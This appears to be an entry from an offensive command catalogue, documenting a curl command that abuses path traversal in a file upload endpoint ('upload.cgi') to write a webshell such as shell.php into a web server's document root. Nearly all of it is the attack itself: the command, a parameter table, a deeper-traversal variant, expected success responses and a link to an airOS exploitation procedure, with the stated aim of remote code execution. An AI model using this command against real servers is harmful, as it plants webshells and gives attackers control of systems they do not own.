---
id: cmd-curl-traversal-001
data: >-
  curl -X POST -F "file=@shell.php;filename=../../../var/www/shell.php"
  http://<target-ip>/upload.cgi
tags:
  - web-exploit
  - file-upload
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.212Z'
verified: false
validated: true
submitted: true
---
# curl-upload-traversal

## Command

```bash
curl -X POST -F "file=@shell.php;filename=../../../var/www/shell.php" http://<target-ip>/upload.cgi
```

## Description

This curl command exploits path traversal in file upload endpoints by specifying a filename with '../' sequences to write files to arbitrary locations. Use it to upload malicious payloads like webshells to web servers for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method for upload | Yes |
| `-F "file=@shell.php;filename=..."` | Multipart form data; @localfile for payload, filename for traversal path | Yes |
| `http://<target-ip>/upload.cgi` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET http://<target-ip>/upload.cgi
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php;filename=../../../../tmp/shell.php" -v http://<target-ip>/upload.cgi
```

Add `-v` for verbose output to debug responses.

## Expected Output

HTTP 200 OK with success message like "Upload successful" or no error on traversal. Failure shows 403/500 if sanitized.

## Related

- [[Related Procedure|procedures/Exploit-Path-Traversal-File-Upload-in-airOS]]
